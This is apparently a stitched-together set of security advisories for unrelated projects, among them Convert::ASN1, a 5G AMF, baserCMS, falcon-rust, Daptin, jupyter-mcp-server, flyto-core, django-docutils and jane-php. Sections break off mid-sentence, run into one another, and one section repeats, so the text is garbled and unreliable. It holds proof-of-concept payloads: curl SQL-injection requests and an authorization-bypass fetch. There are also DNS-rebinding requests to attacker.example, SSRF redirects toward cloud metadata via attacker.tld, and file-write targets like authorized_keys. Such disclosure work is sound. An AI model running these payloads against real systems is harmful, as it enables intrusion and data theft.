A BIT STRING with zero content octets passes -1 to substr as the length. Perl reads a negative length as an offset from the end of the string, so the decoded value is nearly all of the input that follows the element. Convert::ASN1 versions before 0.37 for Perl allow memory exhaustion via unbounded MSG_PEEK buffer doubling in asn_recv.

asn_recv peeks the socket in a loop, doubling the buffer size on each pass until a tag and length can be decoded. An inverted boolean guard ($tb || rather than $tb &&) prevents the need-more-data exit from firing once a tag byte has been decoded. When asn_decode_length returns no value because the length is absent or incomplete, no exit fires for that case either. MSG_PEEK leaves socket data unconsumed, so each re-peek returns at once while the buffer size doubles.

A single truncated BER header sent to a process calling asn_recv doubles the peek buffer until memory is exhausted. Perl's realloc failure is fatal and not catchable with eval.

Convert::ASN1 versions before 0.37 for Perl allow CPU exhaustion via unchecked exponent length in binary REAL decoding.

Binary REAL decoding never bounds-checks the exponent length against the available content. For a minimal one-byte binary REAL, the exponent byte is read from outside the element, making the mantissa length -1. Perl reads a negative length as an offset from the end of the string, so the mantissa is nearly all of the input that follows the element. The long-form exponent path also omits the extra length octet when sizing the mantissa.

An attacker who controls the decoded data can exhaust CPU with a list of such values, as each mantissa loop iterates over the remaining input. The decoded values are also computed from bytes outside each element.

### Summary

`parseServerSignature` in the v1 module only initializes `ServerSignatureVerificationData.Extra` inside the `if err == nil` branch after `url.ParseQuery(parsedPayload.VerificationData)`. Go's `url.ParseQuery` returns the successfully-parsed pairs together with a non-nil error when the query string contains a malformed percent-escape. A subsequent loop unconditionally writes unknown keys into `Extra`, regardless of `err`, causing a nil-map write panic (assignment to entry in nil map) whenever an attacker supplies a `VerificationData` string with a bad %-escape (e.g. `x=1&%zz=2`).

This is reachable pre-authentication: `parseServerSignature` is called by the exported `VerifyServerSignature` / `VerifyServerSignatureSafe` before any HMAC/signature check, and `VerificationData` is attacker-controlled data forwarded by the client as part of the ALTCHA server-signature payload.

### Impact

Any application calling `VerifyServerSignature` or `VerifyServerSignatureSafe` on unauthenticated input can be made to panic by submitting a crafted payload. A crafted PNG can make `imagemeta.Decode` allocate memory far in excess of the input file's size, leading to memory exhaustion. Two separate paths in the `zTXt` "Raw profile type iptc" branch are affected: the declared chunk length drives an allocation directly, and the embedded zlib stream is decompressed without an output bound. A 42-byte file allocated 256 MB, and a 127 KB file allocated 460 MB.

### Impact

Denial of service by memory exhaustion against any application that decodes untrusted PNG images with this library. The decompression bomb is the more reliable vector, since it produces genuinely resident memory; the effect of the oversized `make` depends on the platform's overcommit behavior and any configured `GOMEMLIMIT` or cgroup limit.

### Patches

Fixed in v0.17.3. 

### Workarounds

Reject or bound PNG input size before calling `Decode`, or clear `IPTC` from `Options.Sources` if IPTC metadata is not required.

### Credits

Reported by Arpit Jain ([@arpitjain099](https://github.com/arpitjain099)).

## Summary

HandlePathSwitchRequest guards the UESecurityCapabilities IE for presence but never for length, and the extensible APER type silently yields an empty bit string, so six unguarded index-zero reads panic on an unrecovered goroutine and terminate the AMF. The AMF is the control-plane entry point for a 5G core, so terminating it drops mobility management for every subscriber. Confirmed at HEAD daed5a2 (present in v3.1.5).

## The defect

ngap/handler.go:

```go
if uESecurityCapabilities != nil {                                                                              // line 3267, PRESENCE only
    amfUe.UESecurityCapability.SetEA1_128_5G((uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] & 0x80) >> 7)   // line 3268
    ... (five more Bytes[0] reads, lines 3269-3273)
}
```

Six index-zero reads, all guarded only by a nil check on the containing IE. Why the bit string can be empty: the field is declared `aper:"sizeExt,sizeLB:16,sizeUB:16"`. Because the type is EXTENSIBLE, parseBitString DISCARDS the SIZE(16) constraint when the peer sets the extension bit, and then `if rawLength == 0 { return bitString, nil }` returns a bit string with an empty Bytes slice and NO ERROR. So the decoder hands the handler a well-formed, error-free value whose Bytes has length zero, and the handler indexes it. The length guarantee the maintainers rely on comes from an ASN.1 SIZE constraint that the encoder rules legitimately waive on the extension path.

## Verification

Proven dynamically, not by reading. Eight crafted bytes (40 00 80 00 80 00 80 00) decode cleanly through the REAL APER decoder, and the handler's exact expression then panics with "index out of range [0] with length 0". Panic discipline was checked first: the NGAP receive path has NO recover() (the only recover in the package is on SendToRan, the transmit path), so this is a genuine process kill and the AMF terminates.

Attacker model, stated conservatively: a rogue or compromised gNB on the N2 interface, which additionally needs one registered UE's AMF-UE-NGAP-ID. This is NOT reachable by a bare over-the-air UE; the realistic scenario is a compromised or malicious base station, the threat model N2 security exists to address.

## Suggested fix

Check the length of Bytes before indexing, in all six places, and treat a short or empty bit string as a malformed IE with a PathSwitchRequestFailure rather than proceeding. More durably: since the SIZE constraint is waived on the extension path by design, no aper-decoded bit string can be assumed non-empty, so the same check is needed anywhere else a decoded bit string is indexed. Deduplicated against all eleven existing omec advisories and against hardening commit 030fe7c, which enumerated its sites and MISSED this handler.

## Tooling

AI assistance was used while investigating. The panic was reproduced by driving the real APER decoder with crafted bytes and then the handler's exact expression, and the absence of recover() on the receive path was verified by enumeration rather than assumed. The reporter separately confirmed the six unguarded index-zero reads behind a presence-only check at HEAD.

items.summary: ### Summary An authorization bypass occurs against the API endpoint `/baser/api/admin/` by abusing the session authentication fallback. ### Details The mail settings are used here as an example. Admin side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L100 With `auth => false`, it is not accessible with operator privileges. API side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L286 With `auth => true`, it is accessible even with operator privileges. --- First, the default group for operators has `auth_prefix = 'Admin'`, which does not include `Api/Admin`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/Model/Table/UsersTable.php#L389 Because of this condition, when trying to access the `Api/Admin` API with a JWT, operators have `auth_prefix = 'Admin'`, so they cannot obtain a JWT and should not be able to access it. However, there is a problem in `getAuthenticationService`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/BaserCorePlugin.php#L507 Here, session authentication is enabled even for the `Api/Admin` prefix. By accessing the API with a Referer header, session authentication becomes active, allowing access to the API without holding a JWT. As a result, all APIs configured with `auth => true` in `permission.php` become accessible by operators. ### PoC 1. Log in with a site operator (operator) privileged account. 2. Run the following code in DevTools: ```javascript fetch('/baser/api/admin/baser-core/site_configs/view.json', { headers: { 'Referer': location.origin + '/baser/admin/' } }) .then(r => r.json()) .then(d => { console.table(d.siteConfig); }) ```

The patch added a `realpath()`-based directory traversal check in `BcThemeFileService::getFullpath()`, but the check is **entirely skipped** when `realpath($baseDir)` returns `false` — which occurs whenever the target subdirectory does not physically exist on disk.

An authenticated administrator can bypass the patch by supplying a `type` value (e.g., `js`) that maps to a non-existent directory in the theme. The absence of the directory causes `realpath()` to return `false`, the validation block is skipped, and the raw `path` parameter containing `../` sequences is returned unvalidated. This enables arbitrary file write and remote code execution (RCE) — the exact same impact as the original CVE.

public function getFullpath(string $theme, string $plugin, string $type, string $path)
{

    $baseDir  = $viewPath . $type . DS;      // e.g. .../BcThemeSample/webroot/js/

**Package:** `falcon-rust` (crates.io), repository `github.com/aszepieniec/falcon-rust`
**Affected:** v0.1.3 and the current `master` (HEAD `cfa1b35`). Regression introduced in commit `bf2cf00`.
**Component:** discrete-Gaussian sampler, `src/samplerz.rs` (`approx_exp`, `ber_exp`, `sampler_z`)
**Status:** Confirmed by source review and by empirical measurement of the crate's own compiled code.

## Summary

falcon-rust's discrete-Gaussian rejection sampler evaluates its `exp()` acceptance step at only 32 bits of fractional precision. Measured directly against the crate's own compiled code, `approx_exp` has a maximum relative error of 2^-33. For comparison, the Falcon reference implementation achieves about 2^-63, and the f64 code this crate replaced achieved about 2^-52. The current sampler is therefore roughly 2^19 (about 500,000x) less precise than the version it replaced, and about 2^30 less precise than the reference.

Falcon's security proof relies on the sampled signatures being statistically indistinguishable from an ideal discrete Gaussian, so the signature transcript leaks nothing about the secret trapdoor. That guarantee holds only when the sampler's relative error stays small enough, over the roughly 2^64 signature budget, to keep the Renyi divergence between the real and ideal distributions negligible. The precision the security analysis relies on is cited in the literature between roughly 2^-40 and 2^-46 (for example the FACCT and isochronous-sampling analyses). At 2^-33 the sampler is below every value in that range, roughly 128x to 4096x too coarse depending on which bound you take, so the precondition the proof depends on is not met.

There is a second, bound-independent piece of evidence that removes any ambiguity: the crate's sampler can no longer reproduce Falcon's known-answer test (KAT) vectors, which are the authoritative correctness oracle. Rather than restore the precision, the maintainers loosened their own test tolerance and noted that "rejection decisions may differ at the boundary." The regression is already visible in-tree; its security significance was simply not recognized.

Because the sampler's sigma is derived from the secret basis Gram-Schmidt norms, the resulting distribution deviation is secret-dependent. The `exp` function itself is public, but its inputs, and therefore the deviation, depend on secret quantities. This is the class of flaw that statistical and hidden-number-problem learning attacks on biased Gaussian samplers target.

The crate's own documentation describes this sampler as "side-channel-hardened" and notes that "the sampler defines the secret-key distribution, so getting it wrong weakens the cryptography," which is exactly the property this defect touches.

Root location: `src/samplerz.rs`

* `FixedPoint64 = FixedPoint<i64>` with `FRAC_UNIT = 1 << 32`, i.e. 32 fractional bits (`src/fixed_point.rs`). The crate already defines `FixedPoint128` with 64 fractional bits, the correct-precision type, but the sampler uses `FixedPoint64`.

This takes the 32-bit-precision argument and zero-fills the low 31 bits into a 63-bit word, so the polynomial is evaluated at an argument quantized to 2^-32.

**Component:** discrete-Gaussian sampler, `src/samplerz.rs` (`approx_exp`, `ber_exp`, `sampler_z`)
**Status:** Confirmed by source review and by empirical measurement of the crate's own compiled code.

## Summary

falcon-rust's discrete-Gaussian rejection sampler evaluates its `exp()` acceptance step at only 32 bits of fractional precision. Measured directly against the crate's own compiled code, `approx_exp` has a maximum relative error of 2^-33. For comparison, the Falcon reference implementation achieves about 2^-63, and the f64 code this crate replaced achieved about 2^-52. The current sampler is therefore roughly 2^19 (about 500,000x) less precise than the version it replaced, and about 2^30 less precise than the reference.

Falcon's security proof relies on the sampled signatures being statistically indistinguishable from an ideal discrete Gaussian, so the signature transcript leaks nothing about the secret trapdoor. That guarantee holds only when the sampler's relative error stays small enough, over the roughly 2^64 signature budget, to keep the Renyi divergence between the real and ideal distributions negligible. The precision the security analysis relies on is cited in the literature between roughly 2^-40 and 2^-46 (for example the FACCT and isochronous-sampling analyses). At 2^-33 the sampler is below every value in that range, roughly 128x to 4096x too coarse depending on which bound you take, so the precondition the proof depends on is not met.

There is a second, bound-independent piece of evidence that removes any ambiguity: the crate's sampler can no longer reproduce Falcon's known-answer test (KAT) vectors, which are the authoritative correctness oracle. Rather than restore the precision, the maintainers loosened their own test tolerance and noted that "rejection decisions may differ at the boundary." The regression is already visible in-tree; its security significance was simply not recognized.

Because the sampler's sigma is derived from the secret basis Gram-Schmidt norms, the resulting distribution deviation is secret-dependent. The `exp` function itself is public, but its inputs, and therefore the deviation, depend on secret quantities. This is the class of flaw that statistical and hidden-number-problem learning attacks on biased Gaussian samplers target.

The crate's own documentation describes this sampler as "side-channel-hardened" and notes that "the sampler defines the secret-key distribution, so getting it wrong weakens the cryptography," which is exactly the property this defect touches.

### Summary

Daptin registers a generic WebSocket endpoint, `GET /yjs/:documentName`, for real-time collaborative
document editing (YJS/CRDT). Unlike its purpose-built sibling route, this generic endpoint performs

document store parses `:documentName` as `typename.referenceId.columnName` and fetches that row's
real column content unconditionally, any authenticated user (including a brand-new, zero-privilege,
self-registered account) can read - and, since YJS sync is bidirectional, also write - the content

default.

    if getErr != nil { ginContext.AbortWithStatus(404); return }
    ...

    if !objectPermission.CanUpdate(user.UserReferenceId, user.Groups, cruds[typename].AdministratorGroupId) {
        ginContext.AbortWithStatus(401)
        return
    }
    roomName := fmt.Sprintf("%v%v%v%v%v", typename, ".", referenceId, ".", columnInfo.ColumnName)

### Summary

An unauthenticated attacker can inject arbitrary SQL through the `sort` query parameter accepted by
Daptin's generic entity list endpoint (`GET /api/<entity>`), which every table in a Daptin instance
exposes. The parameter is concatenated into raw SQL identifiers with no validation that the
referenced column exists, unlike a sibling code path in the same file that received exactly this
validation as the fix for a previously published advisory
([GHSA-rw2c-8rfq-gwfv](https://github.com/daptin/daptin/security/advisories/GHSA-rw2c-8rfq-gwfv)).
Impact ranges from unauthenticated denial of service (a single crafted request 500s the query) to
blind/error-based extraction of data from tables the requester has no permission to read.

### Details

`PaginatedFindAllWithoutFilters` in `server/resource/resource_findallpaginated.go` reads the `sort`
query parameter directly from the request with no validation:

```go
// server/resource/resource_findallpaginated.go:300-302
var sortOrder []string
if len(req.QueryParams["sort"]) > 0 {
    sortOrder = req.QueryParams["sort"]
```

Each entry is then concatenated with the table name and passed to `goqu.I()` (goqu's raw SQL
*identifier* constructor) in two separate places, with no check that the referenced column exists
on the table:

```go
// server/resource/resource_findallpaginated.go:435-449 (SELECT column list)
for _, sort := range sortOrder {
    ...
    if strings.Index(sort, "(") == -1 {
        sort = prefix + sort
    }
    idQueryCols = append(idQueryCols, goqu.I(sort).As(strings.ReplaceAll(sort, ".", "_")))
}
```

```go
// server/resource/resource_findallpaginated.go:916-943 (ORDER BY clause)
for _, so := range sortOrder {
    ...
    orders = append(orders, goqu.I(ord).Asc())
}
```

`goqu.I()` renders its argument by wrapping it in the dialect's quote character (a backtick, in
this build's configured dialect) **without escaping an embedded quote character of the same kind**.
A backtick supplied in `sort` closes the identifier early, and the remainder of the attacker string
is parsed as raw SQL grammar rather than treated as inert column-name text.

This is the same bug class as GHSA-rw2c-8rfq-gwfv ("SQL injection via unvalidated `goqu.L()` calls
in aggregate API", CWE-89, fixed in v0.11.4). That fix added an allow-list check a few hundred lines
later in the same file, in the fuzzy-search code path:

```go
// server/resource/resource_findallpaginated.go:1491-1505
// Validate each column against table schema (prevents SQL injection via goqu.L)
tableInfo := dbResource.tableInfo
var validColumns []string
for _, col := range columns {
    if _, ok := tableInfo.GetColumnByName(col); ok {
        validColumns = append(validColumns, col)
    } else {
        log.Warnf(...)
    }
}
```

The identical validation was never applied to the base `sort` parameter handling earlier in the
same file. Unlike fuzzy search (which requires an explicit `filter` operator to reach), plain `sort`
is processed on every list request to every entity, authenticated or not.

### PoC

Build current HEAD and run it with a fresh SQLite database and no custom schema:

```bash
go build -buildvcs=false -o daptin_bin .
./daptin_bin
```

No account needs to exist. `world` (and most default tables) are guest-readable, so all requests
below are sent with **no `Authorization` header at all**:

```bash
# 1) Reflection -- proves raw, unsanitized concatenation
curl -s -G "http://localhost:6336/api/world" --data-urlencode 'sort=email" --'
# => {"errors":[{"status":"500","title":"no such column: world.email\" --"}]}

# Server log shows the exact constructed query:
# SELECT distinct(user_account.id), `user_account`.`email" --` AS `user_account_email" --`
#   FROM `user_account` LEFT JOIN ... WHERE (...) ORDER BY `user_account`.`email" --` ASC LIMIT ? == [10]

# 2) Backtick breakout -- proves the payload is parsed as SQL grammar, not literal text
curl -s -G "http://localhost:6336/api/user_account" \
    --data-urlencode

Standalone `streamable-http` mode in `datalayer/jupyter-mcp-server` rejects forged `Host` and `Origin` headers on `/mcp`, but custom management routes mounted on the same application do not get the same browser-origin protection. A malicious website can keep an attacker origin while its hostname resolves to `127.0.0.1` or a private target address, then send `PUT /api/connect` to replace the MCP server's active Jupyter backend. The route accepts the browser-shaped request and makes the server start a kernel client against attacker-controlled infrastructure.

The protected `/mcp` endpoint shows the intended browser-origin boundary. With `MCP_TOKEN` configured, `/mcp` rejects forged browser headers:

```text
POST /mcp with Authorization: Bearer SCAN_MCP_TOKEN
Host: attacker.example:8142
Origin: http://attacker.example:8142

HTTP 421 Invalid Host header
```

The vulnerable route is `jupyter_mcp_server/server.py:143-187`. It parses caller JSON, updates the active Jupyter backend configuration, resets `ServerContext`, and starts the kernel without applying the `/mcp` Host/Origin rejection to the custom route:

```python
@mcp.custom_route("/api/connect", ["PUT"])
async def connect(request: Request):
    data = await request.json()

    document_runtime = DocumentRuntime(**data)

    set_config(
        provider=document_runtime.provider,
        runtime_url=document_runtime.runtime_url,
        runtime_id=document_runtime.runtime_id,
        runtime_token=document_runtime.runtime_token,
        document_url=document_runtime.document_url,
        document_id=document_runtime.document_id,
        document_token=document_runtime.document_token,
        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or "notebook_run-all-cells,notebook_get-selected-cell"
    )

    ServerContext.reset()

    try:
        __start_kernel()
        return JSONResponse({"success": True})
```

`/api/stop` is also state-changing and accepts the same browser-origin route shape:

```python
# jupyter_mcp_server/server.py:190-199
@mcp.custom_route("/api/stop", ["DELETE"])
async def stop(request: Request):
    try:
        current_notebook = notebook_manager.get_current_notebook() or "default"
        if current_notebook in notebook_manager:
            notebook_manager.remove_notebook(current_notebook)
        return JSONResponse({"success": True})
```

## Proof of concept

Run the affected version with `MCP_TOKEN` configured:

```bash
git clone https://github.com/datalayer/jupyter-mcp-server
cd jupyter-mcp-server
git checkout 27b91e551d8bbca2da32c334f9f13267290ff815
python3.12 -m venv .venv
. .venv/bin/activate
python -m pip install -e .
MCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \
  --transport streamable-http \
  --start-new-runtime false \
  --jupyterlab false \
  --mcp-token SCAN_MCP_TOKEN \
  --port 8083
```

First, show that `/mcp` rejects the browser-shaped request:

```http
POST /mcp HTTP/1.1
Host: attacker.example:8083
Origin: http://attacker.example:8083
Authorization: Bearer SCAN_MCP_TOKEN
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
```

Observed response:

```http
HTTP/1.1 421
Invalid Host header
```

Now send the same browser-origin shape to the custom management route. In a browser DNS-rebinding attack, the attacker-controlled page keeps an attacker origin while the hostname resolves to `127.0.0.1` or the private MCP listener:

```http
PUT /api/connect HTTP/1.1
Host: attacker.example:8083
Origin: http://attacker.example:8083
Content-Type: application/json

{
  "provider": "jupyter",
  "runtime_url": "http://127.0.0.1:9183",
  "runtime_id": "",
  "runtime_token": "ATTACKER_TOKEN_REBIND",

# [MEDIUM] SSRF guard bypass via DNS rebinding — validate_url_ssrf resolves-then-connects without pinning

- **CWE:** CWE-918 (SSRF) / CWE-367 (TOCTOU).
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N` = **6.8 Medium** (AC:H — needs attacker-controlled DNS with a low/zero TTL and to flip the answer between the guard's lookup and the connection's lookup; S:C — reaches internal/metadata services the guard is meant to block; C:H — e.g. cloud metadata credentials at 169.254.169.254).
- **Affected component:** `flyto-core` (PyPI `flyto-core`), HEAD `ae2b38e` (v2.26.7). `src/core/utils.py::validate_url_ssrf` (resolution at `getaddrinfo` ~L512, `is_private_ip` check ~L515) and every consumer: `guarded_aiohttp_request()`, `enforce_outbound_url()`/`validate_url_with_env_config()` — i.e. `http.get/request/batch`, `graphql.query/mutation`, `monitor.http_check`, `notification.{slack,discord,teams}`, `ai.vision_analyze`, `verify.visual_diff`, `browser.proxy_rotate`, etc.
- **Relationship:** Incomplete hardening of the SSRF-guard family (**GHSA-pgwh-4jj4-qm8v**, **GHSA-c9hr-64h3-gxpc**, **GHSA-794r-5rp2-fpg8**/CVE-2026-55787). Those fixes added per-module coverage, redirect revalidation, and IPv6-transition range-checks — but none pins the resolved address, so the guard's resolve-then-connect gap defeats all of them.

## Root cause
`validate_url_ssrf()` resolves the hostname with `socket.getaddrinfo()` and rejects the URL if any resolved IP is private. It then returns the **URL string** (hostname intact). The caller (`guarded_aiohttp_request`: `validate_url_with_env_config(url)` then `session.request(method, url, ...)`) hands the hostname to aiohttp, which performs an **independent second DNS resolution** at connect time. The validated IP is never pinned for the connection, so an attacker whose authoritative DNS returns a public A record for the guard's lookup and a private/loopback/metadata address for the connection's lookup reaches internal space. aiohttp resolves via its own resolver, distinct from the guard's `socket.getaddrinfo`, so the two lookups are genuinely separate — one flip is sufficient.

1. Attacker controls DNS for `rebind.attacker.test` (TTL 0), and drives any guarded HTTP module with `url=http://rebind.attacker.test/` (recipe / MCP `execute_module`).
2. Guard: `getaddrinfo` → public IP → `is_private_ip` false → **URL allowed**.
3. Outbound request: aiohttp re-resolves `rebind.attacker.test` → attacker now answers `127.0.0.1` / `169.254.169.254` → connects to the internal target. Redirect revalidation (GHSA-c9hr) does not help — the initial hop already rebinds.

The attacker's TTL=0 flip is modelled by making `socket.getaddrinfo` return public on lookup #1 (the guard's) and loopback on later lookups (the connection's); a raw local TCP sentinel stands in for the internal service. No payload is sent.

socket.create_connection(("rebind.attacker.test", 8080))   # lands on 127.0.0.1 sentinel

[guard] validate_url_ssrf ALLOWED http://rebind.attacker.test:8080/  (saw public 93.184.216.34 on resolution #1)

## Summary
`http.paginate` validates only the initial `base_url`, then follows server-supplied pagination targets (RFC 5988 `Link: rel="next"` headers, cursor/offset URLs) in a loop **without revalidating each follow-up URL**. An attacker's first-page response can point `next` at an internal address, causing a second-order SSRF whose internal body is aggregated into the returned items.

## Root Cause
`src/core/modules/atomic/http/paginate.py:495` validates `base_url` (first URL only). The pagination loop `_paginate_link_header` reads `next_url` via `_parse_link_header` (:203), sets `url=next_url` (:208), and calls `session.request(method, url)` (:196) with NO validate call in the loop (:186-208 has zero guard calls).

## Impact
Readable second-order SSRF that bypasses the SSRF control; internal/metadata body aggregated into `all_items` and returned to the caller (C:H, S:C).

## Proof of Concept
Verified live: `http.paginate` with allowlisted base `127.0.0.1` followed a `Link: <http://127.0.0.3/...>; rel="next"` (non-allowlisted) and returned `INTERNAL-NEXTPAGE-SECRET` in the aggregated items.
```
execute_module http.paginate {"url":"http://attacker.tld/p1","strategy":"link_header"}
attacker p1 response header: Link: <http://<cloud-metadata-ip>/latest/meta-data/>; rel="next"
```

## Attack Chain
1. Entry: `http.paginate {url:"http://attacker.tld/p1", strategy:"link_header"}`. Guard: `validate_url_with_env_config(base_url)` (paginate.py:495) — validates the FIRST url only.
2. Sink: `_paginate_link_header` reads `next_url` (`_parse_link_header` :203), `url=next_url` (:208), `session.request(method,url)` (:196) — NO validate call in the loop. Bypass proof: only :495 validates; loop at :186-208 has zero guard calls.
3. Impact: internal body aggregated into `all_items` and returned → readable second-order SSRF.

## Bypass Evidence
Live PoC followed a `Link` header into non-allowlisted loopback and returned the internal marker in aggregated results. Only `base_url` is validated; the follow loop never revalidates.

## Affected Versions
`<= 2.26.6` — `paginate.py:495` + loop present on latest release tag.

## Suggested Fix
Run every follow-up URL (Link header, cursor, offset target) through `validate_url_with_env_config` before fetching it inside the pagination loop.

## Summary
`validate_url_ssrf` resolves the hostname, checks the IP against private ranges, then **discards the IP and returns the hostname URL string**. aiohttp performs a fresh, independent DNS resolution at connect time. An attacker controlling DNS for a hostname (TTL 0, alternating public IP and internal IP) passes validation on the first lookup and connects to the internal IP on the second — a classic check-then-use race. SECURITY_SSRF.md line 63 explicitly claims DNS-rebinding is prevented; it is not.

## Root Cause
`src/core/utils.py:523` returns the hostname URL after validation; the resolved IP is never pinned. A repo grep of `http/` and `utils.py` for `TCPConnector` / `resolver` / `response.history` / `on_request_redirect` / IP-pinning returns NONE. Each module builds a fresh `ClientSession` per call → the connect-time `getaddrinfo` is independent of the validation-time lookup.

## Impact
Defeats the SSRF guard on ALL modules that call it (readable internal fetch). Independent of IP-range completeness — the private IP is never presented to `is_private_ip`. Requires attacker DNS control + winning the resolution race → AC:H.

Code-proven: `validate_url_ssrf` returns the hostname (utils.py:523); no pinned-IP connector anywhere. Two independent resolutions occur (validation-time and aiohttp connect-time).

# [CRITICAL] Arbitrary file write via unguarded `data.*` / `file.*` write modules — incomplete fix of GHSA-2956

- **CWE:** CWE-22 (Path Traversal) / CWE-73 (External Control of File Name or Path); impact reaches CWE-94 (code execution via file overwrite).
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **9.3 Critical** (S:C because a write escapes the intended sandbox confinement into the host filesystem / other components).
  - AV:N — reachable via the MCP server / recipe engine (`execute_module`). AC:L — deterministic. PR:L — any client able to run a module/recipe (the same attacker model as GHSA-2956; unauthenticated on the HTTP MCP surface per CVE-2026-55786). UI:N. S:C — escapes `FLYTO_SANDBOX_DIR`. C/I/A:H — arbitrary-content write to any absolute path → overwrite app code / recipes / `~/.bashrc` / cron / `authorized_keys` → RCE.
- **Affected component:** `flyto-core` (PyPI `flyto-core`), HEAD `ae2b38e` (v2.26.7 line). Modules `data.csv.write` (`src/core/modules/atomic/data/csv_write.py`), `data.json_to_csv` (`.../data/json_to_csv.py`), `file.copy` (`.../file/copy.py`), `file.move` (`.../file/move.py`) — and the broader `data.*`/`file.*`/report-writer families that do not call the path guard.
- **Relationship:** **Incomplete fix of GHSA-2956-977x-2w3r** (Critical arbitrary file write, patched in v2.26.6 by commit `d5f89d7`). That fix routed a hand-picked module list (`image.download/convert/resize/crop/compress/rotate/watermark/qrcode_generate`, `document.excel_write/pdf_fill_form/word_to_pdf/pdf_to_word`, `browser.pagination` checkpoint) through `validate_path_with_env_config()`. It did **not** cover the `data.*` and `file.*` write families, which still write a client-controlled path with no confinement.

## Reachability (hop-by-hop, guards resolved)
1. Client invokes a module via the recipe engine / MCP `execute_module` (`src/core/mcp_handler.py`, `mcp_server.py`) — the same surface as GHSA-2956 / CVE-2026-55786.
2. `data.csv.write` reads `file_path = params.get('file_path')` and `data` (both client-controlled). Its only path check is `if '..' in file_path: raise` — a denylist that does **not** block absolute paths.
3. It calls `os.makedirs(os.path.dirname(file_path), exist_ok=True)` then `open(file_path, 'w')` and writes `data`. **No call to `validate_path_with_env_config()`** — so `FLYTO_SANDBOX_DIR` confinement is never applied.
4. `data.json_to_csv` (`output_path`), `file.copy` / `file.move` (`shutil.copy2`/`shutil.move` to `destination`) have **no path check at all**.
5. An absolute path such as `/home/<user>/.bashrc`, `/app/src/core/modules/.../<mod>.py`, or a `.flyto` recipe file is written verbatim, outside the sandbox.

**Guard analysis:** the GHSA-2956 enforcement is per-module (e.g. `image/download.py:21` imports and calls `validate_path_with_env_config`). There is **no central path enforcement** in the runtime — `runtime/languages.py`'s `PathTraversalError` guards *plugin entry-point* loading, not module output paths. So a module that omits the per-module call is entirely unconfined.

## Root cause
The remediation for GHSA-2956 confined writes by adding a per-module `validate_path_with_env_config()` call to an explicit list of modules, rather than enforcing confinement centrally. Any file-writing module absent from that list — the entire `data.*` and `file.*` families here — remains an arbitrary-write primitive. `data.csv.write`'s `'..'`-substring check is a denylist that misses absolute paths.

## Impact
Arbitrary file write with attacker-controlled content and path, escaping `FLYTO_SANDBOX_DIR`. Overwriting a Python module under the install dir, a `.flyto` recipe, a shell rc, a crontab, or `~/.ssh/authorized_keys` yields code execution / full host compromise — the same impact GHSA-2956 was rated Critical for.

## Executable PoC (benign sentinel, local only)
`FLYTO_SANDBOX_DIR` is set to the intended confinement; the module writes *outside* it while the GHSA-2956 guard rejects the same path.

```

items.summary: ## Summary django-docutils before `0.30.0` rendered reStructuredText through Docutils without protected web-safe defaults. Public rendering paths, including `publish_doctree`, `publish_html_from_source`, `publish_html_from_doctree`, `publish_parts_from_doctree`, the `{% rst %}` template tag, the `rst` template filter, `DocutilsTemplates`, and `DocutilsView`, could process attacker-controlled RST with Docutils directives that read local files, fetch URL-backed content, or emit raw HTML. The issue is fixed in `0.30.0` by disabling Docutils file insertion, raw directives, local `docutils.conf` processing, and unsafe URI schemes by default, and by sanitizing doctrees before HTML is emitted. Applications are affected when they render attacker-controlled or lower-trust RST through django-docutils without their own safe Docutils configuration. Applications that only render trusted static RST are not affected unless that content can be influenced by an attacker. ## Impact An attacker who can influence RST rendered by a vulnerable django-docutils integration may be able to read files readable by the Django worker process, trigger server-side requests through URL-backed directives, or inject raw HTML/JavaScript into rendered output. Examples of affected application patterns include comments, wiki pages, blog bodies, profile or biography fields, CMS fields, uploaded RST documents, API-supplied RST, or overridden view content methods that return user-supplied RST. Potential impact includes disclosure of application configuration, environment files, credentials, source files, templates, mounted secrets, and logs readable by the process. UI escaping after rendering is not sufficient for file disclosure because the server-side read occurs before HTML reaches the client. ## Affected versions Affected package: `django-docutils` on PyPI Affected versions: `<= 0.29.0` Patched versions: `>= 0.30.0` ## Technical details Before `0.30.0`, django-docutils handed RST content to Docutils without forcing these web-safe settings: ```python { "file_insertion_enabled": False, "raw_enabled": False, "_disable_config": True, } ``` Docutils treats file insertion and raw content as legitimate features for trusted documents. In a web application that renders lower-trust RST, those defaults can expose server-side data or emit attacker-controlled HTML unless the application disables the features. The vulnerable behavior included: - `.. include:: ` reading local files - `.. include:: ` fetching URL-backed content server-side - `.. csv-table:: :file:` reading local files - `.. csv-table:: :url:` fetching URL-backed content server-side - `.. raw:: html` emitting unescaped HTML - `.. raw:: html :file:` reading and emitting file-backed raw content - local `docutils.conf` configuration re-enabling unsafe behavior ## Proof of concept This minimal harness uses the public `{% rst %}` template tag. ### Summary
jane-php resolves external `$ref` targets at code-generation time via `file_get_contents($ref)` (jane-php/json-schema-runtime/Reference.php::doResolve) with no scheme/path restriction. An attacker-controlled OpenAPI document can therefore cause: `$ref: 'http://attacker/x'` -> SSRF (HTTP GET at gen time; response inlined = RFI); `$ref: '/abs/file'` -> LFI; `$ref: '../secret.yaml'` -> path-traversal LFI (CWE-22, arbitrary local JSON/YAML read). Verified 7.11.2/PHP8.1 (listener records the fetch; remote + `../` local content inlined into the generated code). `file://` rejected. CWE-918/CWE-98/CWE-611/CWE-22.

### Details
```php
// Reference.php::doResolve()
$contents = file_get_contents($fragment); // $fragment = attacker-controlled $ref URI
```

### Impact
Generating PHP with jane from an attacker-influenced OpenAPI document issues HTTP requests to attacker-chosen URLs (SSRF — internal services, cloud metadata) and reads arbitrary local files (LFI via `../`), at build/CI time, inlining results into the output.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): runs jane on a remote-$ref spec (local listener records the SSRF, output checked for the inlined response) and a `../`-traversal local-$ref spec (output checked for the leaked file).

### Suggested fix
